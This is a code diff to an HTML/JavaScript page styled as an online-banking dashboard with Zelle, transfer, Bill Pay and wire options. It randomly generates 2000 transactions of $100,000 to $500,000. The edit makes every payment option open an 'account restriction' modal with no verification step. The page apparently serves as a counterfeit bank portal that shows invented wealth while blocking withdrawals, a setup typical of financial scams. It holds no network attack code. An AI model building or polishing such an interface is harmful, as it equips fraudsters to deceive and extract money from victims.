@@ -45,9 +45,8 @@
             
             <!-- Pay Options Grid -->
             <div class="pay-options-grid">
-                <div class="pay-option-card">
+                <div class="pay-option-card" id="zelleOption">
                     <div class="pay-icon-container zelle-bg">
-                        <!-- Zelle SVG Logo (Text Only) -->
                         <svg viewBox="0 0 100 40" style="width: 50px; height: auto; fill: white;">
                             <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-weight="bold" font-size="28" fill="white" letter-spacing="-1">Zelle</text>
                             <line x1="50" y1="5" x2="50" y2="35" stroke="white" stroke-width="2" transform="rotate(15 50 20)" style="opacity: 0.3;" />
@@ -55,19 +54,19 @@
                     </div>
                     <span class="pay-option-text">Send money with Zelle®</span>
                 </div>
-                <div class="pay-option-card">
+                <div class="pay-option-card" id="transferOption">
                     <div class="pay-icon-container blue-bg">
                         <i class="fas fa-exchange-alt"></i>
                     </div>
                     <span class="pay-option-text">Transfer between accounts</span>
                 </div>
-                <div class="pay-option-card">
+                <div class="pay-option-card" id="billPayOption">
                     <div class="pay-icon-container red-bg">
                         <i class="fas fa-file-invoice-dollar"></i>
                     </div>
                     <span class="pay-option-text">Bill Pay</span>
                 </div>
-                <div class="pay-option-card">
+                <div class="pay-option-card" id="wireOption">
                     <div class="pay-icon-container gray-bg">
                         <i class="fas fa-globe"></i>
                     </div>
@@ -113,7 +112,7 @@
         </nav>
     </div>
 
-    <!-- RESTRICTION MODAL - Same format as original identity verification modal, but with restriction message -->
+    <!-- RESTRICTION MODAL - NO VERIFICATION CODE, JUST RESTRICTION MESSAGE -->
     <div id="restrictionModal" class="modal-overlay">
         <div class="security-modal-content">
             <div class="security-modal-header">
@@ -189,7 +188,7 @@
             ];
 
             const months = ["DEC", "NOV", "OCT", "SEP", "AUG", "JUL", "JUN", "MAY", "APR", "MAR", "FEB", "JAN"];
-            let currentDate = new Date(2025, 11, 15); // Start Dec 15, 2025
+            let currentDate = new Date(2025, 11, 15);
 
             for (let i = 0; i < 2000; i++) {
                 const amount = Math.floor(Math.random() * (500000 - 100000 + 1)) + 100000;
@@ -258,39 +257,63 @@
         }
 
         // ========================
-        // RESTRICTION MODAL LOGIC - EXACT SAME FORMAT AS ORIGINAL IDENTITY VERIFICATION
+        // RESTRICTION MODAL - NO VERIFICATION CODE, JUST SHOW RESTRICTION MESSAGE
         // ========================
         const restrictionModal = document.getElementById('restrictionModal');
         const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
         const contactSupportLink = document.getElementById('contactSupportLink');
         
-        // Get all pay option cards (any action that attempts transfer)
-        const payOptionCards = document.querySelectorAll('.pay-option-card');
-
-        // When user clicks any transfer/pay option, show restriction modal immediately
+        // Get all pay option cards
+        const zelleOption = document.getElementById('zelleOption');
+        const transferOption = document.getElementById('transferOption');
+        const billPayOption = document.getElementById('billPayOption');
+        const wireOption = document.getElementById('wireOption');
+        
+        // Function to show restriction modal immediately - NO CODE VERIFICATION
         function showRestrictionModal() {
             restrictionModal.style.display = 'flex';
         }
 
-        payOptionCards.forEach(card => {
-            card.addEventListener('click', (e) => {
+        // Add click listeners to all pay options - directly show restriction without any verification
+        if (zelleOption) {
+            zelleOption.addEventListener('click', function(e) {
                 e.preventDefault();
                 showRestrictionModal();
             });
-        });
+        }
+        
+        if (transferOption) {
+            transferOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (billPayOption) {
+            billPayOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (wireOption) {
+            wireOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
 
         // Close modal on "I Understand"
         if (closeRestrictionBtn) {
-            closeRestrictionBtn.addEventListener('click', () => {
+            closeRestrictionBtn.addEventListener('click', function() {
                 restrictionModal.style.display = 'none';
             });
         }
 
-        // "Contact Support" – closes modal (maintains same interaction pattern as "Don't have your device?")
+        // Contact Support - closes modal
         if (contactSupportLink) {
-            contactSupportLink.addEventListener('click', () => {
+            contactSupportLink.addEventListener('click', function() {
                 restrictionModal.style.display = 'none';
-                // Optional: could show a small message, but keeping clean per requirements
             });
         }
 
@@ -301,6 +324,7 @@
             }
         });
 
+        // Initialize on page load
         window.onload = function() {
             generateTransactions();
             // Make sure restriction modal is hidden on load
